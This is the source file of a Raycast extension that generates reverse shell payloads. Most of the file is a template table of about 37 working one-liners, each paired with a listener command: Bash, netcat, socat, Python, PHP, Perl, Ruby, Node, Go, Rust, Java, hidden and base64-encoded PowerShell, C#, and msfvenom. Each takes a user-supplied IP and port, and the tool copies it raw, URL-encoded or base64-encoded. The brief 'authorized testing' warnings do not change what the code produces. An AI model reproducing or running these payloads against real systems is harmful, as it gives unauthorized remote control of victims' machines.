import {
  ActionPanel,
  Action,
  Form,
  List,
  Detail,
  useNavigation,
  showToast,
  Toast,
  Icon,
  LocalStorage,
} from "@raycast/api";
import { useState, useEffect } from "react";
import { writeFile } from "fs/promises";
import { homedir } from "os";
import { join } from "path";

// ============================================================================
// Type Definitions
// ============================================================================

interface ShellTemplate {
  type: string;
  name: string;
  icon: string;
  command: string;
  description: string;
  category: "reverse" | "bind" | "msfvenom";
  subcategory: string;
  os: ("linux" | "windows" | "mac")[];
  listener?: string;
}

interface Config {
  ip: string;
  port: string;
}

// ============================================================================
// Shell Templates (40+ types)
// ============================================================================

const SHELL_TEMPLATES: ShellTemplate[] = [
  // ========== Shell Tools ==========
  {
    type: "bash-tcp",
    name: "Bash TCP",
    icon: "🐚",
    command: "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1",
    description: "Bash reverse shell using /dev/tcp",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["linux", "mac"],
    listener: "nc -lvnp {PORT}",
  },
  {
    type: "bash-exec",
    name: "Bash Exec",
    icon: "🐚",
    command: 'bash -c "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"',
    description: "Reverse shell executed with bash -c",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["linux", "mac"],
    listener: "nc -lvnp {PORT}",
  },
  {
    type: "bash-196",
    name: "Bash 196",
    icon: "🐚",
    command: "0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; sh <&196 >&196 2>&196",
    description: "Bash shell using file descriptor 196",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["linux"],
    listener: "nc -lvnp {PORT}",
  },
  {
    type: "bash-udp",
    name: "Bash UDP",
    icon: "🐚",
    command: "sh -i >& /dev/udp/{IP}/{PORT} 0>&1",
    description: "Bash shell using UDP",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["linux"],
    listener: "nc -u -lvnp {PORT}",
  },
  {
    type: "nc-standard",
    name: "Netcat (Standard)",
    icon: "🔌",
    command: "nc -e /bin/bash {IP} {PORT}",
    description: "Standard Netcat reverse shell",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["linux", "mac"],
    listener: "nc -lvnp {PORT}",
  },
  {
    type: "nc-fifo",
    name: "Netcat (FIFO)",
    icon: "🔌",
    command:
      "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f",
    description: "Netcat variant using FIFO pipe",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["linux", "mac"],
    listener: "nc -lvnp {PORT}",
  },
  {
    type: "nc-openbsd",
    name: "Netcat (OpenBSD)",
    icon: "🔌",
    command:
      "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {IP} {PORT} >/tmp/f",
    description: "OpenBSD Netcat reverse shell",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["linux", "mac"],
    listener: "nc -lvnp {PORT}",
  },
  {
    type: "ncat",
    name: "Ncat",
    icon: "🔌",
    command: "ncat {IP} {PORT} -e /bin/bash",
    description: "Ncat tool from Nmap",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["linux", "mac", "windows"],
    listener: "ncat -lvnp {PORT}",
  },
  {
    type: "socat",
    name: "Socat",
    icon: "🔗",
    command:
      "socat tcp-connect:{IP}:{PORT} exec:/bin/sh,pty,stderr,setsid,sigint,sane",
    description: "Socat TCP connection reverse shell",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["linux", "mac"],
    listener: "socat -d -d TCP-LISTEN:{PORT} STDOUT",
  },
  {
    type: "telnet",
    name: "Telnet",
    icon: "📞",
    command:
      "TF=$(mktemp -u);mkfifo $TF && telnet {IP} {PORT} 0<$TF | /bin/sh 1>$TF",
    description: "Telnet reverse shell",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["linux"],
    listener: "nc -lvnp {PORT}",
  },

  // ========== Scripting Languages ==========
  {
    type: "python2",
    name: "Python 2",
    icon: "🐍",
    command:
      'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
    description: "Python 2 socket reverse shell",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux", "mac"],
    listener: "nc -lvnp {PORT}",
  },
  {
    type: "python3",
    name: "Python 3",
    icon: "🐍",
    command:
      'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
    description: "Python 3 socket reverse shell",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux", "mac", "windows"],
    listener: "nc -lvnp {PORT}",
  },
  {
    type: "python-shortest",
    name: "Python (Shortest)",
    icon: "🐍",
    command:
      'python -c \'import os,pty,socket;s=socket.socket();s.connect(("{IP}",{PORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")\'',
    description: "Shortest Python reverse shell",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux", "mac"],
    listener: "nc -lvnp {PORT}",
  },
  {
    type: "python-windows",
    name: "Python (Windows)",
    icon: "🐍",
    command:
      'python -c \'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));subprocess.call(["cmd.exe"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\'',
    description: "Windows Python reverse shell",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["windows"],
    listener: "nc -lvnp {PORT}",
  },
  {
    type: "php-exec",
    name: "PHP (exec)",
    icon: "🐘",
    command:
      'php -r \'$sock=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");\'',
    description: "PHP exec reverse shell",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux", "mac"],
    listener: "nc -lvnp {PORT}",
  },
  {
    type: "php-system",
    name: "PHP (system)",
    icon: "🐘",
    command:
      'php -r \'$sock=fsockopen("{IP}",{PORT});system("/bin/sh -i <&3 >&3 2>&3");\'',
    description: "PHP system reverse shell",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux", "mac"],
    listener: "nc -lvnp {PORT}",
  },
  {
    type: "php-passthru",
    name: "PHP (passthru)",
    icon: "🐘",
    command:
      'php -r \'$sock=fsockopen("{IP}",{PORT});passthru("/bin/sh -i <&3 >&3 2>&3");\'',
    description: "PHP passthru reverse shell",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux", "mac"],
    listener: "nc -lvnp {PORT}",
  },
  {
    type: "php-shell_exec",
    name: "PHP (shell_exec)",
    icon: "🐘",
    command:
      'php -r \'$sock=fsockopen("{IP}",{PORT});shell_exec("/bin/sh -i <&3 >&3 2>&3");\'',
    description: "PHP shell_exec reverse shell",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux", "mac"],
    listener: "nc -lvnp {PORT}",
  },
  {
    type: "perl",
    name: "Perl",
    icon: "🐪",
    command:
      'perl -e \'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")};\'',
    description: "Perl socket reverse shell",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux", "mac"],
    listener: "nc -lvnp {PORT}",
  },
  {
    type: "ruby",
    name: "Ruby",
    icon: "💎",
    command:
      'ruby -rsocket -e\'f=TCPSocket.open("{IP}",{PORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
    description: "Ruby TCPSocket reverse shell",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux", "mac"],
    listener: "nc -lvnp {PORT}",
  },
  {
    type: "nodejs",
    name: "Node.js",
    icon: "🟢",
    command:
      'node -e \'(function(){var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/sh", []);var client = new net.Socket();client.connect({PORT}, "{IP}", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();\'',
    description: "Node.js net module reverse shell",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux", "mac", "windows"],
    listener: "nc -lvnp {PORT}",
  },
  {
    type: "lua",
    name: "Lua",
    icon: "🌙",
    command:
      "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{IP}','{PORT}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
    description: "Lua socket reverse shell",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux"],
    listener: "nc -lvnp {PORT}",
  },
  {
    type: "awk",
    name: "Awk",
    icon: "🦅",
    command:
      'awk \'BEGIN {s = "/inet/tcp/0/{IP}/{PORT}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\'',
    description: "Awk reverse shell",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux"],
    listener: "nc -lvnp {PORT}",
  },

  // ========== Compiled Languages ==========
  {
    type: "golang",
    name: "Golang",
    icon: "🔷",
    command:
      'echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{IP}:{PORT}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go',
    description: "Golang reverse shell",
    category: "reverse",
    subcategory: "Compiled Languages",
    os: ["linux", "mac"],
    listener: "nc -lvnp {PORT}",
  },
  {
    type: "rust",
    name: "Rust",
    icon: "🦀",
    command:
      'echo \'use std::net::TcpStream;use std::os::unix::io::{AsRawFd, FromRawFd};use std::process::{Command, Stdio};fn main(){let s=TcpStream::connect("{IP}:{PORT}").unwrap();let fd=s.as_raw_fd();Command::new("/bin/sh").arg("-i").stdin(unsafe{Stdio::from_raw_fd(fd)}).stdout(unsafe{Stdio::from_raw_fd(fd)}).stderr(unsafe{Stdio::from_raw_fd(fd)}).spawn().unwrap().wait().unwrap();}\' > /tmp/t.rs && rustc /tmp/t.rs -o /tmp/t && /tmp/t && rm /tmp/t /tmp/t.rs',
    description: "Rust reverse shell",
    category: "reverse",
    subcategory: "Compiled Languages",
    os: ["linux", "mac"],
    listener: "nc -lvnp {PORT}",
  },
  {
    type: "java",
    name: "Java",
    icon: "☕",
    command:
      'java -c \'public class shell { public static void main(String[] args) { try { String host="{IP}"; int port={PORT}; String cmd="/bin/sh"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start(); Socket s=new Socket(host,port); InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream(); OutputStream po=p.getOutputStream(),so=s.getOutputStream(); while(!s.isClosed()) { while(pi.available()>0) so.write(pi.read()); while(pe.available()>0) so.write(pe.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); Thread.sleep(50); try { p.exitValue(); break; } catch (Exception e){} }; p.destroy(); s.close(); } catch (Exception e){} } }\'',
    description: "Java Socket reverse shell",
    category: "reverse",
    subcategory: "Compiled Languages",
    os: ["linux", "mac", "windows"],
    listener: "nc -lvnp {PORT}",
  },

  // ========== Windows ==========
  {
    type: "powershell-1",
    name: "PowerShell #1",
    icon: "⚡",
    command:
      'powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient("{IP}",{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
    description: "Windows PowerShell reverse shell #1",
    category: "reverse",
    subcategory: "Windows",
    os: ["windows"],
    listener: "nc -lvnp {PORT}",
  },
  {
    type: "powershell-2",
    name: "PowerShell #2",
    icon: "⚡",
    command:
      "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
    description: "Windows PowerShell reverse shell #2",
    category: "reverse",
    subcategory: "Windows",
    os: ["windows"],
    listener: "nc -lvnp {PORT}",
  },
  {
    type: "powershell-base64",
    name: "PowerShell (Base64)",
    icon: "⚡",
    command:
      "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAewBJAFAAfQAiACwAewBQAE8AUgBUAH0AKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA",
    description: "Base64 encoded PowerShell shell",
    category: "reverse",
    subcategory: "Windows",
    os: ["windows"],
    listener: "nc -lvnp {PORT}",
  },
  {
    type: "csharp",
    name: "C# TCP Client",
    icon: "🔷",
    command:
      'using System;using System.Text;using System.IO;using System.Diagnostics;using System.ComponentModel;using System.Linq;using System.Net;using System.Net.Sockets;namespace ConnectBack{public class Program{static StreamWriter streamWriter;public static void Main(string[] args){using(TcpClient client = new TcpClient("{IP}", {PORT})){using(Stream stream = client.GetStream()){using(StreamReader rdr = new StreamReader(stream)){streamWriter = new StreamWriter(stream);StringBuilder strInput = new StringBuilder();Process p = new Process();p.StartInfo.FileName = "cmd.exe";p.StartInfo.CreateNoWindow = true;p.StartInfo.UseShellExecute = false;p.StartInfo.RedirectStandardOutput = true;p.StartInfo.RedirectStandardInput = true;p.StartInfo.RedirectStandardError = true;p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);p.Start();p.BeginOutputReadLine();while(true){strInput.Append(rdr.ReadLine());p.StandardInput.WriteLine(strInput);strInput.Remove(0, strInput.Length);}}}}}static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine){StringBuilder strOutput = new StringBuilder();if (!String.IsNullOrEmpty(outLine.Data)){try{strOutput.Append(outLine.Data);streamWriter.WriteLine(strOutput);streamWriter.Flush();}catch (Exception err) {}}}}}}',
    description: "C# TCP Client reverse shell",
    category: "reverse",
    subcategory: "Windows",
    os: ["windows"],
    listener: "nc -lvnp {PORT}",
  },

  // ========== MSFVenom Payloads ==========
  {
    type: "msfvenom-linux-x64",
    name: "MSFVenom Linux x64",
    icon: "🎯",
    command:
      "msfvenom -p linux/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f elf > shell.elf",
    description: "MSFVenom Linux x64 ELF reverse shell",
    category: "msfvenom",
    subcategory: "Payload Generators",
    os: ["linux"],
    listener:
      'msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT {PORT}; run"',
  },
  {
    type: "msfvenom-linux-x86",
    name: "MSFVenom Linux x86",
    icon: "🎯",
    command:
      "msfvenom -p linux/x86/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f elf > shell.elf",
    description: "MSFVenom Linux x86 ELF reverse shell",
    category: "msfvenom",
    subcategory: "Payload Generators",
    os: ["linux"],
    listener:
      'msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT {PORT}; run"',
  },
  {
    type: "msfvenom-windows-x64",
    name: "MSFVenom Windows x64",
    icon: "🎯",
    command:
      "msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f exe > shell.exe",
    description: "MSFVenom Windows x64 EXE reverse shell",
    category: "msfvenom",
    subcategory: "Payload Generators",
    os: ["windows"],
    listener:
      'msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT {PORT}; run"',
  },
  {
    type: "msfvenom-windows-x86",
    name: "MSFVenom Windows x86",
    icon: "🎯",
    command:
      "msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f exe > shell.exe",
    description: "MSFVenom Windows x86 EXE reverse shell",
    category: "msfvenom",
    subcategory: "Payload Generators",
    os: ["windows"],
    listener:
      'msfconsole -q -x "use exploit/multi/handler; set payload windows/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT {PORT}; run"',
  },
  {
    type: "msfvenom-mac",
    name: "MSFVenom macOS",
    icon: "🎯",
    command:
      "msfvenom -p osx/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f macho > shell.macho",
    description: "MSFVenom macOS Mach-O reverse shell",
    category: "msfvenom",
    subcategory: "Payload Generators",
    os: ["mac"],
    listener:
      'msfconsole -q -x "use exploit/multi/handler; set payload osx/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT {PORT}; run"',
  },
];

// ============================================================================
// Utility Functions
// ============================================================================

// Generate all commands
function generateAllCommands(ip: string, port: string): ShellTemplate[] {
  return SHELL_TEMPLATES.map((template) => ({
    ...template,
    command: template.command.replace(/{IP}/g, ip).replace(/{PORT}/g, port),
    listener: template.listener?.replace(/{IP}/g, ip).replace(/{PORT}/g, port),
  }));
}

// Validate IP address
function isValidIP(ip: string): boolean {
  const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
  if (!ipRegex.test(ip)) return false;
  const parts = ip.split(".");
  return parts.every((part) => parseInt(part) >= 0 && parseInt(part) <= 255);
}

// Validate port number
function isValidPort(port: string): boolean {
  const portNum = parseInt(port);
  return !isNaN(portNum) && portNum >= 1 && portNum <= 65535;
}

// URL encoding
function urlEncode(str: string): string {
  return encodeURIComponent(str);
}

// Base64 encoding
function base64Encode(str: string): string {
  return Buffer.from(str).toString("base64");
}

// Group by subcategory
function groupBySubcategory(
  commands: ShellTemplate[],
): Record<string, ShellTemplate[]> {
  const groups: Record<string, ShellTemplate[]> = {};
  commands.forEach((cmd) => {
    if (!groups[cmd.subcategory]) {
      groups[cmd.subcategory] = [];
    }
    groups[cmd.subcategory].push(cmd);
  });
  return groups;
}

// Get OS tag color
function getOSTagColor(os: string): string {
  switch (os) {
    case "linux":
      return "#FFA500";
    case "windows":
      return "#0078D4";
    case "mac":
      return "#000000";
    default:
      return "#808080";
  }
}

// ============================================================================
// LocalStorage Functions
// ============================================================================

const STORAGE_KEY_IP = "lastIP";
const STORAGE_KEY_PORT = "lastPort";

async function loadConfig(): Promise<Config> {
  const ip =
    (await LocalStorage.getItem<string>(STORAGE_KEY_IP)) || "10.10.10.10";
  const port = (await LocalStorage.getItem<string>(STORAGE_KEY_PORT)) || "9001";
  return { ip, port };
}

async function saveConfig(config: Config): Promise<void> {
  await LocalStorage.setItem(STORAGE_KEY_IP, config.ip);
  await LocalStorage.setItem(STORAGE_KEY_PORT, config.port);
}

// ============================================================================
// Components
// ============================================================================

interface FormValues {
  ip: string;
  port: string;
}

// Display all generated commands list
function ShowAllCommands({ ip, port }: FormValues) {
  const { pop } = useNavigation();
  const [osFilter, setOsFilter] = useState<string>("all");
  const [sortBy, setSortBy] = useState<string>("category");

  // Generate all commands
  const allCommands = generateAllCommands(ip, port);

  // OS filtering
  const filteredCommands =
    osFilter === "all"
      ? allCommands
      : allCommands.filter((cmd) =>
          cmd.os.includes(osFilter as "linux" | "windows" | "mac"),
        );

  // Sorting
  const sortedCommands = [...filteredCommands].sort((a, b) => {
    switch (sortBy) {
      case "name":
        return a.name.localeCompare(b.name);
      case "os":
        return a.os[0].localeCompare(b.os[0]);
      case "category":
      default:
        return a.subcategory.localeCompare(b.subcategory);
    }
  });

  const groupedCommands = groupBySubcategory(sortedCommands);

  return (
    <List
      navigationTitle={`Reverse Shell Commands - ${ip}:${port}`}
      searchBarPlaceholder="Search shell types..."
      isShowingDetail
      searchBarAccessory={
        <List.Dropdown
          tooltip="Filter by OS"
          value={osFilter}
          onChange={setOsFilter}
        >
          <List.Dropdown.Item title="All Systems" value="all" />
          <List.Dropdown.Item title="Linux" value="linux" icon="🐧" />
          <List.Dropdown.Item title="Windows" value="windows" icon="🪟" />
          <List.Dropdown.Item title="macOS" value="mac" icon="🍎" />
        </List.Dropdown>
      }
    >
      {Object.entries(groupedCommands).map(([subcategory, cmds]) => (
        <List.Section key={subcategory} title={subcategory}>
          {cmds.map((cmd) => (
            <List.Item
              key={cmd.type}
              icon={cmd.icon}
              title={cmd.name}
              accessories={cmd.os.map((os) => ({
                tag: { value: os.toUpperCase(), color: getOSTagColor(os) },
              }))}
              detail={
                <List.Item.Detail
                  markdown={`
# ${cmd.icon} ${cmd.name}

## Description
${cmd.description}

## Target Configuration
- **IP Address**: ${ip}
- **Port**: ${port}
- **Supported OS**: ${cmd.os.map((o) => o.toUpperCase()).join(", ")}

## Generated Command

\`\`\`bash
${cmd.command}
\`\`\`

${cmd.listener ? `## Listener Command\n\n\`\`\`bash\n${cmd.listener}\n\`\`\`` : ""}

---

> ⚠️ **Security Warning**
> 
> This command should only be used in authorized security testing environments.
> Unauthorized use of reverse shells may violate laws and regulations.
`}
                />
              }
              actions={
                <ActionPanel>
                  <Action.CopyToClipboard
                    title="Copy Command"
                    content={cmd.command}
                    shortcut={{ modifiers: ["cmd"], key: "c" }}
                    onCopy={() => {
                      showToast({
                        style: Toast.Style.Success,
                        title: "Copied to Clipboard",
                        message: cmd.name,
                      });
                    }}
                  />
                  <Action.CopyToClipboard
                    title="Copy URL Encoded"
                    content={urlEncode(cmd.command)}
                    shortcut={{ modifiers: ["cmd", "shift"], key: "u" }}
                    onCopy={() => {
                      showToast({
                        style: Toast.Style.Success,
                        title: "Copied URL Encoded Command",
                        message: cmd.name,
                      });
                    }}
                  />
                  <Action.CopyToClipboard
                    title="Copy Base64 Encoded"
                    content={base64Encode(cmd.command)}
                    shortcut={{ modifiers: ["cmd", "shift"], key: "b" }}
                    onCopy={() => {
                      showToast({
                        style: Toast.Style.Success,
                        title: "Copied Base64 Encoded Command",
                        message: cmd.name,
                      });
                    }}
                  />
                  {cmd.listener && (
                    <Action.CopyToClipboard
                      title="Copy Listener Command"
                      content={cmd.listener}
                      shortcut={{ modifiers: ["cmd", "shift"], key: "l" }}
                      onCopy={() => {
                        showToast({
                          style: Toast.Style.Success,
                          title: "Copied Listener Command",
                          message: cmd.name,
                        });
                      }}
                    />
                  )}
                  <Action
                    title="Save to File"
                    icon={Icon.Download}
                    shortcut={{ modifiers: ["cmd"], key: "s" }}
                    onAction={async () => {
                      try {
                        const filePath = join(
                          homedir(),
                          "Downloads",
                          `${cmd.type}_${Date.now()}.sh`,
                        );
                        await writeFile(filePath, cmd.command);
                        showToast({
                          style: Toast.Style.Success,
                          title: "Saved to File",
                          message: filePath,
                        });
                      } catch (error) {
                        showToast({
                          style: Toast.Style.Failure,
                          title: "Save Failed",
                          message:
                            error instanceof Error
                              ? error.message
                              : "Unknown error",
                        });
                      }
                    }}
                  />
                  <ActionPanel.Section title="Sort">
                    <Action
                      title="Sort by Category"
                      icon={Icon.AppWindowList}
                      shortcut={{ modifiers: ["cmd", "shift"], key: "1" }}
                      onAction={() => setSortBy("category")}
                    />
                    <Action
                      title="Sort by Name"
                      icon={Icon.Text}
                      shortcut={{ modifiers: ["cmd", "shift"], key: "2" }}
                      onAction={() => setSortBy("name")}
                    />
                    <Action
                      title="Sort by Os"
                      icon={Icon.ComputerChip}
                      shortcut={{ modifiers: ["cmd", "shift"], key: "3" }}
                      onAction={() => setSortBy("os")}
                    />
                  </ActionPanel.Section>
                  <Action
                    title="Re-enter Ip/port"
                    icon={Icon.ArrowClockwise}
                    shortcut={{ modifiers: ["cmd"], key: "r" }}
                    onAction={pop}
                  />
                </ActionPanel>
              }
            />
          ))}
        </List.Section>
      ))}
    </List>
  );
}

// Main form component
export default function Command() {
  const [ipError, setIpError] = useState<string | undefined>();
  const [portError, setPortError] = useState<string | undefined>();
  const [ip, setIp] = useState<string>("");
  const [port, setPort] = useState<string>("");
  const [isLoading, setIsLoading] = useState(true);
  const { push } = useNavigation();

  // Load configuration
  useEffect(() => {
    loadConfig().then((config) => {
      setIp(config.ip);
      setPort(config.port);
      setIsLoading(false);
    });
  }, []);

  function handleSubmit(values: FormValues) {
    // Validate IP
    if (!isValidIP(values.ip)) {
      setIpError("Invalid IP address format");
      return;
    }

    // Validate port
    if (!isValidPort(values.port)) {
      setPortError("Port must be between 1-65535");
      return;
    }

    // Clear errors
    setIpError(undefined);
    setPortError(undefined);

    // Save configuration
    saveConfig({ ip: values.ip, port: values.port });

    // Navigate to commands list page
    push(<ShowAllCommands ip={values.ip} port={values.port} />);
  }

  function incrementPort() {
    const currentPort = parseInt(port);
    if (!isNaN(currentPort) && currentPort < 65535) {
      setPort((currentPort + 1).toString());
    }
  }

  if (isLoading) {
    return <Detail isLoading={true} />;
  }

  return (
    <Form
      actions={
        <ActionPanel>
          <Action.SubmitForm
            title="Generate All Commands"
            onSubmit={handleSubmit}
          />
          <Action
            title="Increment Port"
            icon={Icon.Plus}
            shortcut={{ modifiers: ["cmd"], key: "=" }}
            onAction={incrementPort}
          />
        </ActionPanel>
      }
    >
      <Form.TextField
        id="ip"
        title="Target IP Address"
        placeholder="192.168.1.100"
        value={ip}
        error={ipError}
        onChange={(value) => {
          setIp(value);
          setIpError(undefined);
        }}
      />
      <Form.TextField
        id="port"
        title="Listener Port"
        placeholder="9001"
        value={port}
        error={portError}
        onChange={(value) => {
          setPort(value);
          setPortError(undefined);
        }}
      />
      <Form.Description text="⚠️ Use only in authorized security testing environments | 💾 Configuration will be saved automatically" />
    </Form>
  );
}
